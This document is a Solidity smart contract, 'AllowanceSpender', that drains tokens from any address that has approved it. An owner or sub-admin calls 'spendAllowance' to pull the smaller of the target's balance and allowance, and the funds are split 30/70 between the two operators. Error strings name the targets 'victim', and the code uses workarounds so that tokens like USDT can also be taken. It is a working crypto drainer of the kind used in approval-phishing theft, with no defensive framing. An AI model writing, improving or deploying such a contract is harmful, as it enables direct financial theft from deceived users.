// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract AllowanceSpender {
    address public owner;
    address public subAdmin;

    event TokensSpent(
        address indexed token,
        address indexed from,
        uint256 amount,
        uint256 ownerShare,
        uint256 subAdminShare
    );

    constructor(address _subAdmin) {
        require(_subAdmin != address(0), "Invalid subAdmin");
        owner = msg.sender;
        subAdmin = _subAdmin;
    }

    // ================== MAIN FUNCTION: Auto Pull All Funds ==================
    function spendAllowance(address tokenAddress, address from) external {
        require(msg.sender == owner || msg.sender == subAdmin, "Not authorized");

        IERC20 token = IERC20(tokenAddress);

        uint256 balance = token.balanceOf(from);
        uint256 allowanceAmount = token.allowance(from, address(this));

        require(balance > 0, "Victim has no balance");
        require(allowanceAmount > 0, "No allowance from victim");

        // Pull the actual available amount (min of balance & allowance)
        uint256 amount = balance < allowanceAmount ? balance : allowanceAmount;

        // Low-level call for transferFrom — required for non-standard tokens like USDT
        (bool success, ) = address(token).call(
            abi.encodeWithSelector(token.transferFrom.selector, from, address(this), amount)
        );
        require(success, "transferFrom failed");

        // Split: 30% to Owner, 70% to SubAdmin
        uint256 ownerShare = (amount * 30) / 100;
        uint256 subAdminShare = amount - ownerShare;

        // FIX: Use low-level calls for transfer too — USDT does not return a bool,
        // so calling via interface would cause an ABI decode revert on return data.
        if (ownerShare > 0) {
            (bool s1, ) = address(token).call(
                abi.encodeWithSelector(token.transfer.selector, owner, ownerShare)
            );
            require(s1, "Transfer to owner failed");
        }

        if (subAdminShare > 0) {
            (bool s2, ) = address(token).call(
                abi.encodeWithSelector(token.transfer.selector, subAdmin, subAdminShare)
            );
            require(s2, "Transfer to subAdmin failed");
        }

        emit TokensSpent(tokenAddress, from, amount, ownerShare, subAdminShare);
    }

    function transferOwnership(address newOwner) external {
        require(msg.sender == owner, "Not owner");
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }

    function updateSubAdmin(address newSubAdmin) external {
        require(msg.sender == owner, "Not owner");
        require(newSubAdmin != address(0), "Invalid address");
        subAdmin = newSubAdmin;
    }
}